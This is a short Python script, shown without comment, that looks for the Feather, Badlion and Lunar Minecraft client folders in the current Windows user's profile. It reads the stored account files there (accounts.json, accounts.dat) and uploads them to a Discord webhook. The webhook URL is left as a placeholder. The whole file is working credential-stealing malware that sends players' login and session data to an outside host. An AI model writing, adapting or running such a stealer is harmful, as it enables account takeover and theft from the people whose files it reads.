import os
import getpass
from discord_webhook import DiscordWebhook

def check_and_run(folder_path, script_function, webhook_url):
    if os.path.exists(folder_path) and os.path.isdir(folder_path):
        script_function(folder_path, webhook_url)
    else:
        pass

def script_for_feather(folder_path, webhook_url):
    file_path = os.path.join(folder_path, "accounts.json")
    with open(file_path, "rb") as file:
        file_content = file.read()
    webhook = DiscordWebhook(url=webhook_url)
    webhook.add_file(file=file_content, filename="accounts.json")
    response = webhook.execute()

def script_for_badlion(folder_path, webhook_url):
    file_path = os.path.join(folder_path, "accounts.dat")
    with open(file_path, "rb") as file:
        file_contents = file.read()
    webhook = DiscordWebhook(url=webhook_url)
    webhook.add_file(file=file_contents, filename="accounts.dat")
    response = webhook.execute()

def script_for_lunar(folder_path, webhook_url):
    file_path = os.path.join(folder_path, "accounts.json")
    with open(file_path, "rb") as file:
        file_contents = file.read()
    webhook = DiscordWebhook(url=webhook_url)
    webhook.add_file(file=file_contents, filename="accounts.json")
    response = webhook.execute()

def main():
    username = getpass.getuser()
    webhook_url = "Webhook"
    folders_to_check = [
        {"path": r"C:\Users\{}\AppData\Roaming\.feather".format(username), "script": script_for_feather},
        {"path": r"C:\Users\{}\AppData\Roaming\Badlion Client".format(username), "script": script_for_badlion},
        {"path": r"C:\Users\{}\.lunarclient\settings\game".format(username), "script": script_for_lunar}
    ]
    for folder_info in folders_to_check:
        folder_path = folder_info["path"]
        script_function = folder_info["script"]
        check_and_run(folder_path, script_function, webhook_url)

if __name__ == "__main__":
    main()
